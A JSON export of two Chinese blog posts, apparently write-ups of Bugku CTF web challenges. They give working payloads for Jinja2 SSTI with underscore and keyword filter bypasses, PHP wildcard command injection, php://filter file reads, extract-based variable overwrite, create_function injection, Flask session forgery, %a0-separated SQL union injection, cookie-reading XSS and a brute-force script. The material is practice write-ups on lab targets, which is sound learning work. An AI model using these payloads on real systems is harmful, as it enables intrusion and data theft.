[{"title":"Bugku平台刷题题解2","url":"/2025/11/28/11.24-11.28bugku/","content":"时间11.24-11.27\n平台bugku\n\nssti由题目知道是ssti注入\n\n打开后仅看到seaeching for: None?之外并无其他信息（包括源码也只有这一串），猜测是传参search，于是传入\n?search=&#123;&#123;7*7&#125;&#125;\n\n\n成功回显，开始尝试注入，我的注入比较公式化，每次都是从下面这个payload开始，因为这个通常不难的情况下都可以成功，如果遇到过滤，先考虑拼接绕过，如果部分拼接绕不过就考虑用bp先爆破一下ssti的常用字符，看可用字符有哪些，然后再重新构造其他payload\n&#123;&#123;config.__class__.__init__.__globals__.os.popen(&#x27;ls /&#x27;).read()&#125;&#125;\n\n在这里经过多次尝试之后发现皆是被过滤，无法绕过，于是用bp爆破常用字符\n\n发现大部分基本都被过滤，于是尝试了对其进行部分拼接绕过，发现仍然行不通，查了一下，发现是__双下划线被过滤了QAQ，于是重新写payload：\n&#123;&#123;config[&#x27;_&#x27;&#x27;_&#x27;&#x27;c&#x27;&#x27;l&#x27;&#x27;a&#x27;&#x27;s&#x27;&#x27;s&#x27;&#x27;_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_&#x27;&#x27;init&#x27;&#x27;_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_&#x27;&#x27;globals&#x27;&#x27;_&#x27;&#x27;_&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;\n\n\n成功获取flag位置，将ls &#x2F;修改为cat &#x2F;flag即可获取flag了\n\n？？？？\n打开发现提交按钮带着灰色不能点，那按钮的属性应该是disabled，并且只能输入四个字符，于是打开源码，将disabled属性删去，并把maxlength改为6即可输入yulige并提交\n\n提交后，提示flag不在这，跳转到sh3ll.php\n\n代码注释提示flag再fl4g_is_here.php文件中；分析代码，需要post一个cmd，先对其进行正则匹配，不能存在除lmn外的字母以及不能存在数字，随后再次过滤了一连串的符号，包括_和&#x2F;；基于lmn我们有一个读取命令是nl可以绕过，而对于fl4g_is_here.php，我们则可以使用对应长度的?进行绕过\ncmd=nl ????????????????\n\n\n有显示，但是没有flag，源码看看\n\nupload\n这种题，上来先用旧的payload图片尝试，发现行不通，不过绿色字给出一些提示，read.php?filename&#x3D;，那我们先尝试读取一下源码，经过尝试，这里不能直接filename&#x3D;index.php直接读取，于是转向伪协议\nread.php?filename=php://filter/convert.base64-encode/resource=index.php\n\n\n将其解码后为：\n&lt;div class=&quot;light&quot;&gt;&lt;span class=&quot;glow&quot;&gt;\t\t\t&lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; onsubmit=&quot;return checkFile()&quot;&gt;\t\t\t\t嘿伙计，传个火？！                &lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;upload_file&quot;/&gt;                &lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;upload&quot;/&gt;            &lt;/form&gt;      &lt;/span&gt;&lt;span class=&quot;flare&quot;&gt;&lt;/span&gt;&lt;div&gt;\t  &lt;!--read.php?filename=  --&gt;&lt;?php\terror_reporting(0);\t//设置上传目录\tdefine(&quot;UPLOAD_PATH&quot;, &quot;./uplo4d&quot;);\t$msg = &quot;Upload Success!&quot;;\tif (isset($_POST[&#x27;submit&#x27;])) &#123;        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];        $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];        $ext = pathinfo($file_name,PATHINFO_EXTENSION);      if(preg_match(&quot;/ph/i&quot;, strtolower($ext)))&#123;        die(&quot;这可不能上传啊！&quot;);    &#125;                 $content = file_get_contents($temp_file);            if(preg_match(&quot;/php/i&quot;, $content))&#123;                die(&quot;诶，被我发现了吧&quot;);            &#125;        $new_file_name = md5($file_name).&quot;.&quot;.$ext;        $img_path = UPLOAD_PATH . &#x27;/&#x27; . $new_file_name;        if (move_uploaded_file($temp_file, $img_path))&#123;            $is_upload = true;        &#125; else &#123;            $msg = &#x27;Upload Failed!&#x27;;        &#125;        echo &#x27;&lt;div style=&quot;color:#F00&quot;&gt;&#x27;.$msg.&quot; Look here~ &quot;.$img_path.&quot;&lt;/div&gt;&quot;;    &#125;?&gt;\n\n发现其上传目录为.&#x2F;uplo4d，并对文件后缀和文件内容中的php进行相关过滤，既然读取了index.php，不妨对需要用到的read.php也读取一下\n\n&lt;?phperror_reporting(0);$a=$_GET[&quot;filename&quot;];if(preg_match(&#x27;/flag/i&#x27;,$a))&#123;  exit(&quot;nononono&quot;);&#125;include($a);?&gt;\n\n发现其对flag进行了过滤，对于两个过滤，做如下应对：\nindex.php：使用短标签+图片后缀+文件包含进行执行\nread.php：与????一题中一样使用同等长度的?\n\n\n成功获取到flag位置，于是将上个请求中的ls &#x2F;修改为cat &#x2F;????，获取地址后复制粘贴再次发送\n\n\n告诉我们flag在环境变量中，那我们同样的步骤再来一回即可\n\nswitch\n提示vim，用dirsearch扫描看看有没有相关文件\n\n确实有，在url加入后下载\n\n整理后为\n&lt;?phperror_reporting(0);// flag 在 flag.php 文件中$id = $_POST[&#x27;id&#x27;] ? $_POST[&#x27;id&#x27;] : 0;$file = $_POST[&#x27;file&#x27;] ? $_POST[&#x27;file&#x27;] : &quot;&quot;;if ($id == &#x27;2&#x27;) &#123;    die(&quot;no no no !&quot;);&#125;switch ($id) &#123;    case 0:        die(&#x27;&lt;h1 align=&quot;center&quot;&gt;&lt;font color=&quot;red&quot;&gt;Do you know vim in Linux?&lt;/font&gt;&lt;/h1&gt;&#x27;);    case 1:        die(&quot;0xGame Good!&quot;);    case 2:        die(&quot;0xGame Good!&quot;);&#125;if (preg_match(&#x27;/filter|base64/&#x27;, $file)) &#123;    die(&#x27;hacker&#x27;);&#125;include($file);die(&quot;hacker&quot;);?&gt;\n\n分析源码，我们需要post传参一个id和一个file，id不能为0,1,2其中任何一个值且不能为空，file中不能包含小写的filter和base64，于是我们构造payload\nid=2a&amp;file=php://FiltER/convert.BasE64-encode/resource=flag.php\n\n\n\nsearch\n\n没有看到什么信息，扫描试试\n\n存在&#x2F;admin登录界面，进去看看\n\n没有对用户名的信息，只有提示密码是四位纯数字，那么猜测用户名为admin，密码则对其进行爆破\n\n调整参数进行爆破\n\n爆破了很久之后发现0310的长度与众不同，查看响应后成功找到flag\nheader\n告诉我们打开方式不对，且题目提示header，尝试一番过后发现是将请求方式修改为POST\n\n修改User-Agent为N1k01a\n\n在User-Agent后面添加X-Forwarded-For: 127.0.0.1\n\n解码得到\n\n需要我们GET一个0xGame2021，POST一个X1cT34m和一个Pupi1，要求X1cT34m的md5与Pupi1的md5值相同且\n0xGame2021值为welcome to the 0xGame2021\n\nedr\n进来后并未看到多少有用信息，于是把后面的字填进去尝试了一下\n\n看到警告信息中有一个file_get_contents函数，说明在其源码中有这个函数，可能是个漏洞，于是想办法获取源码，而由于这个界面信息不多，于是直接dirsearch扫描了一下\n\n发现有.bak文件，获取查看后成功获得一大串源码\n&lt;?php/** * c.php * 查看ldb的日志 * 支持正则表达式过滤，可以过滤文件以及每行日志 */ call_user_func(function() &#123;    /**     * 编解码     * @param string $data 编解码数据     * @return string 返回编解码数据     */    $code = function($data) &#123;        for ($i = 0; $i &lt; strlen($data); ++$i) &#123;            $data[$i] = $data[$i] ^ &#x27;G&#x27;;        &#125;        return $data;    &#125;;        /**     * 加密请求     * @param string $site  站点     * @param string $query 请求串     * @return string 返回请求URL     */    $request = function($site, $query) use(&amp;$code) &#123;        $path = base64_encode($code($query));        return &quot;$site/$path&quot;;    &#125;;        /**     * 解密回复     * @param string $data 回复数据     * @return array 返回回复数据     */    $response = function($data) use(&amp;$code) &#123;        $ret = json_decode($data, true);        if (is_null($ret)) &#123;            $dec = $code(base64_decode($data));            $ret = json_decode($dec, true);        &#125;        return $ret;    &#125;;        /**     * 找到匹配的日志     * @param string $path 文件路径匹配     * @param string $item 日志项匹配     * @param string $topn TOP N      * @param string $host 主机     * @return array 返回匹配结果     */    $collect = function($path, $item, $topn, $host) use(&amp;$request, &amp;$response) &#123;        $path   = urlencode($path);        $item   = urlencode($item);        $result = file_get_contents($request(&quot;http://127.0.0.1&quot;, &quot;op=ll&amp;host=$host&amp;path=$path&amp;item=$item&amp;top=$topn&quot;));        return $response($result);    &#125;;        /**     * 显示某个表单域     * @param array $info 表单域信息, array(&quot;name&quot; =&gt; &quot;xx&quot;, &quot;value&quot; =&gt; &quot;xxx&quot;, &quot;note&quot; =&gt; &quot;help&quot;);     * @return     */    $show_input = function($info) &#123;        extract($info);        $value = htmlentities($value);        echo &quot;&lt;p&gt;&lt;font size=2&gt;$title: &lt;/font&gt;&lt;input type=\\&quot;text\\&quot; size=30 id=\\&quot;$name\\&quot; name=\\&quot;$name\\&quot; value=\\&quot;$value\\&quot;&gt;&lt;font size=2&gt;$note&lt;/font&gt;&lt;/p&gt;&quot;;    &#125;;        /**     * 去掉反斜杠     * @param string $var 值     * @return string 返回去掉反斜杠的值     */    $strip_slashes = function($var) &#123;        if (!get_magic_quotes_gpc()) &#123;            return $var;        &#125;        return stripslashes($var);    &#125;;    /**     * 显示表单     * @param array $params 请求参数     * @return     */    $show_form = function($params) use(&amp;$strip_slashes, &amp;$show_input) &#123;        extract($params);        $host  = isset($host)  ? $strip_slashes($host)  : &quot;127.0.0.1&quot;;        $path  = isset($path)  ? $strip_slashes($path)  : &quot;&quot;;        $row   = isset($row)   ? $strip_slashes($row)   : &quot;&quot;;        $limit = isset($limit) ? $strip_slashes($limit) : 1000;                // 绘制表单        echo &quot;&lt;pre&gt;&quot;;        echo &#x27;&lt;form id=&quot;studio&quot; name=&quot;studio&quot; method=&quot;post&quot; action=&quot;&quot;&gt;&#x27;;        $show_input(array(&quot;title&quot; =&gt; &quot;Host &quot;,  &quot;name&quot; =&gt; &quot;host&quot;,  &quot;value&quot; =&gt; $host,  &quot;note&quot; =&gt; &quot; - host, e.g. 127.0.0.1&quot;));        $show_input(array(&quot;title&quot; =&gt; &quot;Path &quot;,  &quot;name&quot; =&gt; &quot;path&quot;,  &quot;value&quot; =&gt; $path,  &quot;note&quot; =&gt; &quot; - path regex, e.g. mapreduce&quot;));        $show_input(array(&quot;title&quot; =&gt; &quot;Row  &quot;,  &quot;name&quot; =&gt; &quot;row&quot;,   &quot;value&quot; =&gt; $row,   &quot;note&quot; =&gt; &quot; - row regex, e.g. \\s[w|e]\\s&quot;));        $show_input(array(&quot;title&quot; =&gt; &quot;Limit&quot;,  &quot;name&quot; =&gt; &quot;limit&quot;, &quot;value&quot; =&gt; $limit, &quot;note&quot; =&gt; &quot; - top n, e.g. 100&quot;));        echo &#x27;&lt;input type=&quot;submit&quot; id=&quot;button&quot;&gt;&#x27;;        echo &#x27;&lt;/form&gt;&#x27;;        echo &quot;&lt;/pre&gt;&quot;;    &#125;;        /**     * 入口函数     * @param array $argv 配置参数     * @return     */    $main = function($argv)         use(&amp;$collect) &#123;        extract($argv);        if (!isset($limit)) &#123;            return;        &#125;        $result = $collect($path, $row, $limit, $host);        if (!is_array($result)) &#123;            echo $result, &quot;\\n&quot;;            return;        &#125;        if (!isset($result[&quot;success&quot;]) || $result[&quot;success&quot;] !== true) &#123;            echo $result, &quot;\\n&quot;;            return;        &#125;        foreach ($result[&quot;data&quot;] as $host =&gt; $items) &#123;            $last = &quot;&quot;;            foreach ($items as $item) &#123;                if ($item[&quot;name&quot;] != $last) &#123;                    $last = $item[&quot;name&quot;];                    echo &quot;\\n[$host] -&gt; $last\\n\\n&quot;;                &#125;                echo $item[&quot;item&quot;], &quot;\\n&quot;;            &#125;        &#125;    &#125;;        set_time_limit(0);    echo &#x27;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; Content=&quot;text/html; Charset=utf-8&quot;&gt;&lt;/head&gt;&#x27;;    echo &#x27;&lt;body bgcolor=&quot;#e8ddcb&quot;&gt;&#x27;;    echo &quot;&lt;p&gt;&lt;b&gt;Log Helper&lt;/b&gt;&lt;/p&gt;&quot;;    $show_form($_REQUEST);    echo &quot;&lt;pre&gt;&quot;;    $main($_REQUEST);    echo &quot;&lt;/pre&gt;&quot;;  &#125;);?&gt;\n\n对于这么长一串代码，我肯定是不可能全盘分析的，因为前面的警告信息中存在file_get_contents函数，于是找到了这一行\n$result = file_get_contents($request(&quot;http://127.0.0.1&quot;, &quot;op=ll&amp;host=$host&amp;path=$path&amp;item=$item&amp;top=$topn&quot;));\n\n然后对其中的$host，$path，$item，$topn几个变量进行二次搜索，找到这么两段\n$show_form = function($params) use(&amp;$strip_slashes, &amp;$show_input) &#123;        extract($params);        $host  = isset($host)  ? $strip_slashes($host)  : &quot;127.0.0.1&quot;;        $path  = isset($path)  ? $strip_slashes($path)  : &quot;&quot;;        $row   = isset($row)   ? $strip_slashes($row)   : &quot;&quot;;        $limit = isset($limit) ? $strip_slashes($limit) : 1000;\n\n$show_form($_REQUEST);\n\n用$_REQUEST进行变量信息获取，再加一个extract和$strip_slashes($host)这个形式，可以联想到变量覆盖构造恶意命令，于是构造payload（$host，$path，$row，$limit都存在被$strip_slashes()包裹的形式，用哪一个都可以）\n?strip_slashes=system&amp;host=ls /\n\n\n获取flag位置之后修改ls &#x2F;为cat &#x2F;flag即可\n\nbug1\n分析源码，需要post传参Poria、Pupi1、N1k0la、action四个参数，对N1k0la的值用密钥求哈希值作为下一次的密钥，然后对Pupi1求哈希值，且需要Poria的值等于这个哈希值，最后需要用action和Pupi1以特定的形式传合适的参数构成恶意命令获取需要的信息；\n因为一开始的密钥值未知，所以正常输入N1k0la的哈希值肯定是我们控制不了的，所以我们采用数组的方式输入，这样密钥就会返回为NULL，变得可控，然后我们构造action为create_function，Pupi1为};system(“ls”);&#x2F;*，将Pupi1的值以NULL为密钥求哈希值为d2cbf3b1c42456c0aaf9d45f0a5093c0dcc2e69b695005d4815dfec282310eb0，然后写payload\nN1k0la[]=1&amp;Poria=d2cbf3b1c42456c0aaf9d45f0a5093c0dcc2e69b695005d4815dfec282310eb0&amp;action=create_function&amp;Pupi1=&#125;;system(&quot;ls&quot;);/*\n\n\n然后修改Pupi1为};system(“cat fllllllaaaaaaaaag.php”);&#x2F;*，对其求哈希值给Poria，修改payload为\nN1k0la[]=1&amp;Poria=0b22a88cfea0eebcae3bd812d0b418ad1a1048363c78e139901007b73ce811e4&amp;action=create_function&amp;Pupi1=&#125;;system(&quot;cat fllllllaaaaaaaaag.php&quot;);/*\n\n\n即可在源码中看到flag\nsession\n进去有个登陆界面，先随便尝试登录一下\n\n题目是session，那我们登录之后直接看cookie，拿到了session，我们还需要密钥，注意到右下角可以切换界面\n\n看到这个界面就很熟悉了，尝试49，显示回显，那我们获取一下密钥\n\n有了密钥就可以解密session然后伪造一个尝试登录了\n\n结构很简单，我们将其修改一下，名字修改为admin，然后因为admin通常应该是在最前面的，于是把uid修改为1，最后payload为{‘name’: ‘admin’, ‘uid’: ‘1’}，加密一下为eyJuYW1lIjoiYWRtaW4iLCJ1aWQiOiIxIn0.aSupLQ.5QS09R97LAd0k_Wenl_sG8fO2GA\n\n尝试登录点击flag\n\n成功获取flag\n","categories":["CTF"],"tags":["web","wp","note"]},{"title":"Bugku平台刷题题解1","url":"/2025/11/23/11.17-11.23bugku/","content":"时间11.17-11.23\nssti1、题目已经声明为ssti，打开后传参?search&#x3D;49也可以确定\n\n2、然后进行逐个尝试，发现很多字符都被过滤，比如class、init、globals等\n\n\n\n\n3、我们使用字符串拼接进行绕过，依次传入\n1、?search=&#123;&#123;config[&#x27;_&#x27;&#x27;_&#x27;&#x27;c&#x27;&#x27;l&#x27;&#x27;a&#x27;&#x27;s&#x27;&#x27;s&#x27;&#x27;_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_&#x27;&#x27;i&#x27;&#x27;n&#x27;&#x27;i&#x27;&#x27;t&#x27;&#x27;_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_&#x27;&#x27;g&#x27;&#x27;l&#x27;&#x27;o&#x27;&#x27;b&#x27;&#x27;a&#x27;&#x27;l&#x27;&#x27;s&#x27;&#x27;_&#x27;&#x27;_&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;2、?search=&#123;&#123;config[&#x27;_&#x27;&#x27;_&#x27;&#x27;c&#x27;&#x27;l&#x27;&#x27;a&#x27;&#x27;s&#x27;&#x27;s&#x27;&#x27;_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_&#x27;&#x27;i&#x27;&#x27;n&#x27;&#x27;i&#x27;&#x27;t&#x27;&#x27;_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_&#x27;&#x27;g&#x27;&#x27;l&#x27;&#x27;o&#x27;&#x27;b&#x27;&#x27;a&#x27;&#x27;l&#x27;&#x27;s&#x27;&#x27;_&#x27;&#x27;_&#x27;][&#x27;os&#x27;].popen(&#x27;cat flag&#x27;).read()&#125;&#125;\n\n得到flag\n\n\n知识点1、遇到被ban的字符时可以使用[&#x27;o&#x27;&#x27;s&#x27;]或者[&#x27;o&#x27;+&#x27;s&#x27;]或者[&#x27;o&#x27;~&#x27;s&#x27;]进行拼接绕过\n\n\n\nSSTI 01、题目同样已经说明是ssti，进去后传入49一样可以确定，参数在进入后可以知道是name\n\n2、防止有过滤，一个个测试过去，发现没有，直接可以读取，传入\n?name=&#123;&#123;config.__class__.__init__.__globals__.os.popen(&#x27;ls /&#x27;).read()&#125;&#125;\n\n\n有回显，但是并没有看到flag（其实bin前面一个SSTI根目录，flag就在里面，但是老眼昏花没看见）\n3、修改传参内的ls命令为find命令寻找flag位置\n?name=&#123;&#123;config.__class__.__init__.__globals__.os.popen(&#x27;find / -name &quot;flag*&quot; 2&gt;/dev/null&#x27;).read()&#125;&#125;\n\n成功找到了flag位置\n\n4、cat命令获取flag即可\n?name=&#123;&#123;config.__class__.__init__.__globals__.os.popen(&#x27;cat /sys/devices/platform/serial8250/tty/ttyS3/flags /SSTI/flag&#x27;).read()&#125;&#125;\n\n\n全球最大交友网站1、打开题目后看到几个文件，其中有个压缩包，先点一下下载下来\n\n2、下完打开后发现是git文件，感觉可能要寻找前面的日志内容，于是转虚拟机又下了一遍，然后解压\n\n\n3、解压后使用git log查看历史\n\n4、get show逐个查看，在第一个就找到了flag\n\n知识点git log\t\t\t查看当前 Git 仓库的提交历史git show\t\t显示某次提交的详细信息，默认显示最新的一次提交wget -r 地址\t\t递归下载一个网站或目录\n\n\n\n小绿草之最强大脑1、打开发现是计算题，但是数额明显巨大，手算是不可能的，考虑脚本或者特性；其次在查看源码时给了提示，源码泄露，于是dirsearch扫了一下发现有.bak文件，下载查看\n\n\n\n2、下载.bak文件后得到源码\n&lt;?phpif(isset($_SESSION[&#x27;ans&#x27;]) &amp;&amp; isset($_POST[&#x27;ans&#x27;]))&#123;\tif(($_SESSION[&#x27;ans&#x27;])+intval($_POST[&#x27;input&#x27;])!=$_POST[&#x27;ans&#x27;])&#123;\t\tsession_destroy();\t\techo &#x27;\t\t&lt;script language=&quot;javascript&quot;&gt;  \t\talert(&quot;怎么没算对呢？&quot;);  \t\twindow.history.back(-1);  &lt;/script&gt;&#x27;;\t&#125;\telse&#123;\t\tif(intval(time())-$_SESSION[&#x27;time&#x27;]&lt;1)&#123;\t\t\tsession_destroy();\t\t\techo &#x27;\t\t\t&lt;script language=&quot;javascript&quot;&gt;  \t\t\talert(&quot;你手速太快啦，服务器承受不住!!!&quot;);  \t\t\twindow.history.back(-1); &lt;/script&gt; &#x27;;\t\t&#125;\t\tif(intval(time())-$_SESSION[&#x27;time&#x27;]&gt;2)&#123;\t\t\tsession_destroy();\t\t\techo &#x27;\t\t\t&lt;script language=&quot;javascript&quot;&gt;  \t\t\talert(&quot;你算的太慢了少年！&quot;);  \t\t\twindow.history.back(-1); &lt;/script&gt; &#x27;;\t\t&#125;\t\techo &#x27;\t\t&lt;script language=&quot;javascript&quot;&gt;  \t\talert(&quot;tql，算对了！！&quot;);  \t     &lt;/script&gt; &#x27;;\t\t$_SESSION[&#x27;count&#x27;]++;\t&#125;&#125;?&gt;\n\n没有看到有直接输出flag的，但是有次数的增加，那应该是需要积累次数到一定数值会输出flag；这个计算的判定是要\n($_SESSION[&#x27;ans&#x27;])+intval($_POST[&#x27;input&#x27;])=$_POST[&#x27;ans&#x27;]\n\n而intval有个特性是输入值超过最大值时会被截断为最大值，所以我们只需要写一个脚本，先获取SESSION[‘ans’]的值，然后给intval($POST[‘input’])一个超过最大值的数，比如1111111111111111111111（不写科学技术法，比如1e22，会被intval错误解析为1，然后脚本一直发送，服务武器一直错误解析为1然后一直生成新的SESSION[‘ans’]，脚本得不到结束的信息就会导致两者之间陷入死循环），然后给$POST[‘ans’]定义为最大值加上获取到的SESSION[‘ans’]的值，再控制一下传入时间，自动循环跑，直至出flag就可以了，脚本如下：\nimport requestsfrom bs4 import BeautifulSoupimport timesession = requests.session()url=&quot;http://49.232.142.230:14235/&quot;cookies=&#123;&quot;PHPSESSID&quot;: &quot;bohuhj0odvcfopngpolcigp5n2&quot;&#125;re = session.get(url)num = &quot;1111111111111111111111&quot;num_intval=&quot;9223372036854775807&quot;while(1):    soup = BeautifulSoup(re.text, &#x27;html.parser&#x27;)    div_tags = soup.find_all(&#x27;div&#x27;, &#123;&#x27;style&#x27;: &#x27;display:inline;&#x27;&#125;)    calc = &quot;&quot;    if div_tags:        for div_tag in div_tags:            calc += div_tag.text    else:        print(&quot;未找到目标标签&quot;)        exit(0)    data=&#123;&quot;input&quot;: num, &quot;ans&quot;: eval(num_intval+calc[:-1])&#125;    re = session.post(url=url,cookies=cookies,data=data)    if re.status_code != 200:        print(&#x27;fail&#x27;)        exit(0)    if &quot;nctf&quot; in re.text:        print(re.text)    time.sleep(1)\n\n\n知识点intval()\tPHP 编程语言中用于获取变量的整数值的函数dirsearch\tPython 编写的命令行式的Web路径扫描器，常用命令形式为python dirsearch.py -u 网址.bak文件\t\t常见的备份文件扩展名，在题目中常常包含关于解题的信息\n\n\n\nFlask PLUS1、题目写明是flask，那可能有ssti漏洞，进去之后没有看到什么有用的信息，只有右下角有可以切换的页面，尝试切换\n\n2、切换页面后一直没想到有什么注入点，搜了之后才知道这个报错是把url直接贴出来了，所以注入点就在url里面，直接输入49，输出了49，确定\n\n\n3、找到了注入点就开始一个个字符尝试，看看有没有过滤，发现过滤了很多，比如config、class、init等，找了一个ssti常见字符的txt文本，用bp批量尝试之后，找到了一些没被过滤的字符，323的都是被ban的字符，响应头里面都是Y0u_Ar3_Hacker\n\n\n4、那我们在其他剩余的字符里面找字符，再用字符串拼接的方式绕过几个关键的字符就可以拼凑payload了\n&#123;&#123;lipsum.__globals__[&#x27;o&#x27;&#x27;s&#x27;][&#x27;pop&#x27;&#x27;en&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;\n\n\n修改ls &#x2F;为cat &#x2F;Th1s_is__F1114g即可获取flag\n\n知识点对于过滤字符比较多的题目，可以跟爆破密码一样对其进行爆破，字符表如下：.[]_&#123;&#125;&#123;&#123;&#125;&#125;&#123;%%&#125;&#123;%if&#123;%endif&#123;%print(1234567890&#x27;&quot;+%20%2B%2bjoin()uospopenimportliblinecachesubprocess|attr()requestargsvaluecookie__getitem__()__class____base____bases____mro____subclasses__()__builtins____init____globals____import____dic____getattribute__()__getitem__()__str__()lipsumcurrent_app\n\n\n\nflask真香这题因为已经写过plus版本了，所以plus版本里面的payload直接拿来用就成功过关了，具体的步骤可以直接用plus版本里面的\n\n\n滴!晨跑打卡1、进入题目后发现是一个查询框，可能是sql注入，输入1’，发现报错，报错信息显示确实是sql，并且还把sql语句直接显示了出来\n\n2、输入1’ UNION SELECT 1,2,3 ‘想获取信息，但是发现被过滤，于是开始一个个尝试，发现1’UNION’可行，但是1’UNION SELECT’不可行，考虑SELECT被过滤，但是尝试1’SELECT’后发现可行，对比三者，感觉应该是空格被过滤\n\n\n\n\n3、尝试将空格进行url编码后绕过，输入1’UNION%a0SELECT%a01,2,3’，发现可行\n\n4、在尝试payload的时候，发现#与-都被过滤，只能用’进行闭合，且这个url里面有个id参数，用于提交在搜索框提交的信息，但是不知道为什么，1’%a0union%a0select%a01,2,’3这种的，在搜索框里面传行不通，但是直接给id这个get参数却可以执行，可能是解码的问题，于是后续改为直接给id传\n\n\n5、在输入1’%a0union%a0select%a01,2,’3时，显示列数不匹配，于是增加一列1’%a0union%a0select%a01,2,3,’4，成功回显，说明列表有四列，但是这里只显示三列信息？应该是被隐藏了一列？\n\n6、尝试获取第四列的名字\n1&#x27; union select (select group_concat(column_name) from information_schema.columns where table_name=&#x27;pcnumber&#x27;),2,3,&#x27;41&#x27;%a0union%a0select%a0(select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name=&#x27;pcnumber&#x27;),2,3,&#x27;4\n\n\n7、知道是flag之后，尝试读取第四列的信息，应该就可以拿到flag了\n1&#x27; union select (select group_concat(flag) from pcnumber),2,3,&#x27;41&#x27;%a0union%a0select%a0(select%a0group_concat(flag)%a0from%a0pcnumber),2,3,&#x27;4\n\n\n知识点sql中测试报错常用1、1&#x27;、1&quot;union\t\t\t\tSQL 中的一个关键字，用于将两个或多个 SELECT 语句的结果集合并成一个结果集select\t\t\t\t从数据库表中查询（选择）数据group_concat()\t\t用于在 SELECT，UPDATE，DELETE 等语句中指定过滤条件where\t\t\t\tMySQL中一个非常实用的聚合函数，作用是将一个分组内指定列的所有值连接成一个单一的字符串column_name \t\tcolumns 表中的一个字段，代表列的名称information_schema \tMySQL 数据库自带的一个系统数据库，它存储了关于所有其他数据库、表、列等的元数据信息columns \t\t\tinformation_schema 中的一个表，它记录了所有表的列信息\n\n\n\ncookies1、进入题目看到登录框和验证框，对提示进行md5计算后发现是0e开头，推测应该是md5弱比较，使用240610708即可过验证，用户名先随意输入admin试试\n\n2、多次输入不同密码后发现其将用户名进行输出，并且对密码不设验证，那考虑漏洞在用户名上，测试49、1’与1’’情况与前面相同，排除ssti与sql漏洞，于是尝试xss\n\n3、尝试之后发现确实是\n&lt;script&gt;(1)&lt;/script&gt;\n\n\n4、知道是xss之后就卡住了，最后搜了才知道要使用document.cookie（中途想到题目叫cookies，还看了它的cookie，发现没东西）\n&lt;script&gt;alert(document.cookie)&lt;/script&gt;\n\n\n知识点&lt;script&gt;\t\t\t用于定义客户端脚本，它既可以包含脚本语句，也可以通过 src 属性引用外部脚本文件alert()\t\t\t\tJavaScript 的一个内置函数，用于显示一个包含指定消息和&quot;确定&quot;按钮的警告对话框document.cookie\t\tavaScript 属性，用于读取和设置与当前文档（网页）相关的 Cookie\n\n\n\nEasy Audit1、进入题目看到一屏幕的代码(代码作用和绕过方法我写在&#x2F;&#x2F;后面了)\n &lt;?phphighlight_file(__FILE__);error_reporting(0);if($_REQUEST)&#123;    foreach ($_REQUEST as $key =&gt; $value) &#123;        if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))   die(&#x27;waf..&#x27;);    &#125;&#125;//遍历接收的所有变量，对其值进行检测，不允许有英文字符，但是根据其特性，同时存在post和get请求变量时post请求变量会将get请求变量覆盖掉，从而让get请求变量中存在英文字符绕过检测if($_SERVER)&#123;    if(preg_match(&#x27;/yulige|flag|nctf/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;]))  die(&#x27;waf..&#x27;);&#125;//检测变量，不允许有yulige|flag|nctf这三个字符串，用编码绕过即可if(isset($_GET[&#x27;yulige&#x27;]))&#123;    if(!(substr($_GET[&#x27;yulige&#x27;], 32) === md5($_GET[&#x27;yulige&#x27;])))&#123;        die(&#x27;waf..&#x27;);//yulinge变量从第32个字符之后开始算，其md5值要与其本身的md5相等，可以用数组进行绕过    &#125;else&#123;        if(preg_match(&#x27;/nctfisfun$/&#x27;, $_GET[&#x27;nctf&#x27;]) &amp;&amp; $_GET[&#x27;nctf&#x27;] !== &#x27;nctfisfun&#x27;)&#123;            $getflag = file_get_contents($_GET[&#x27;flag&#x27;]);        &#125;//nctf变量中是否以nctfisfun结尾，但是不能只是nctfisfun，在前面加一个1即可        if(isset($getflag) &amp;&amp; $getflag === &#x27;ccc_liubi&#x27;)&#123;            include &#x27;flag.php&#x27;;            echo $flag;//上面一段接收了参数flag，并使用了file_get_contents这个文件读取函数，如果给flag传参ccc_liubi，而服务器上没有这个文件的话，就会返回给getflag空或者false，无法获取flag，可以使用data进行绕过，传flag=data://text/plain,ccc_liubi        &#125;else die(&#x27;waf..&#x27;);    &#125;&#125;?&gt;\n\n最终payload：\n原始：yulige[]=1&amp;nctf=1nctfisfun&amp;flag=data://text/plain,ccc_liubi编码后：%79%75%6c%69%67%65[]=1&amp;%6e%63%74%66=1%6e%63%74%66isfun&amp;%66%6c%61%67=data://text/plain,ccc_liubi\n\n\n知识点foreach\t\t PHP 中专门用于遍历数组和对象的循环结构。它提供了一种简单、直观的方式来迭代数组中的每个元素$_REQUEST\t一个包含了 GET、POST 和 COOKIE 数据的超全局数组。它用于收集通过不同 HTTP 方法提交的表单数据，但是它的顺序优先级是cookie&gt;post&gt;get，所以如果同名的情况下，优先级高的会覆盖掉优先级低的data://text/plain\t允许在 URL 